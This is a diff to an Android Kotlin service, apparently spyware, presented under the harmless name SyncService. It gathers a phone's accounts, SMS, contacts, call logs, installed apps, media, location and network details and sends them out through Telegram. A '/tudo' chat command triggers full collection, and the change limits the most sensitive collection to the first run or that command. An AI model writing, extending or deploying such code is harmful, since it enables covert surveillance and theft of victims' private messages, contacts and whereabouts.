@@ -1,4 +1,3 @@
-
 package com.example.monitor
 
 import android.app.Notification
@@ -48,6 +47,7 @@ class SyncService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var offset = 0L
     private val dir by lazy { File(cacheDir, "coleta").apply { mkdirs() } }
+    private var primeiraColeta = true
 
     private val ciclo = object : Runnable {
         override fun run() {
@@ -132,16 +132,19 @@ class SyncService : Service() {
     private fun rotinaCompleta() {
         try {
             enviarSecao("Aparelho", Collector.aparelho(this))
+            enviarSecao("Localização", Collector.localizacao(this))
             enviarSecao("Rede", Collector.rede(this))
             enviarSecao("Wi-Fi", Collector.wifi(this))
-            enviarSecao("Localização", Collector.localizacao(this))
-            enviarSecao("Contas", Collector.contas(this))
-            enviarSecao("SMS", Collector.sms(this))
-            enviarSecao("Contatos", Collector.contatos(this))
-            enviarSecao("Chamadas", Collector.chamadas(this))
-            enviarSecao("Aplicativos", Collector.aplicativos(this))
-            enviarMidia()
-            enviarRoot()
+            if (primeiraColeta) {
+                enviarSecao("Contas", Collector.contas(this))
+                enviarSecao("SMS", Collector.sms(this))
+                enviarSecao("Contatos", Collector.contatos(this))
+                enviarSecao("Chamadas", Collector.chamadas(this))
+                enviarSecao("Aplicativos", Collector.aplicativos(this))
+                enviarMidia()
+                enviarRoot()
+                primeiraColeta = false
+            }
         } catch (e: Exception) {
             Log.e(TAG, "rotina", e)
         }
@@ -217,6 +220,7 @@ class SyncService : Service() {
                 }
             }
             "/tudo" -> {
+                primeiraColeta = true
                 executor.execute { rotinaCompleta() }
                 Telegram.send("Coleta completa disparada.", chat)
             }
